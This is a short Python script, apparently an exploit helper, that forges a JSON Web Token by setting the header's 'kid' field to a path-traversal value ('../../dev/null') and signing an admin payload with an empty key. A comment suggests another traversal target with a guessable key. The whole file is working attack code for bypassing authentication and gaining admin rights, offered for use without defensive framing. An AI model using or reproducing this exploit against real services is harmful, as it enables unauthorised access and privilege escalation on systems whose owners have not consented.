import hmac
import base64
import hashlib
import json

header={"typ":"JWT","alg":"HS256","kid":"../../dev/null"}
#/dev/null returns nothing
#you can also try, "kid":"/proc/sys/kernel/randomize_va_space" with key=2

payload={"user":"admin"}
key =""


#saving modified header and payload
str=base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")

#generating signature using hs256
sig=base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('utf8').rstrip("=") 

jwt_token=str+"."+sig

#print str+"."+sig

print "jwt_token has been generated:\n"+ jwt_token
